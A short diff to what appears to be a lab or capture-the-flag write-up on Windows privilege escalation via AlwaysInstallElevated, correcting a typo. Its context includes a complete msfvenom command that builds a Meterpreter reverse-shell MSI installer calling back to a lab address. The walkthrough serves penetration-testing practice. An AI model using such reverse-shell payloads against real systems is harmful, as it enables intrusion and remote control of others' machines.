@@ -215,7 +215,7 @@ We found credentials as well:
 ![Privesc Credentials](./pic/creds.png)
 	
 that means we can try this exploit about [AlwaysInstallElevated](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/).
-The wxploit start by crafting the .msi installer on local machine:
+The exploit start by crafting the .msi installer on local machine:
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp lhost=10.8.79.118 lport=8888 -f msi -o rev.msi
 ```
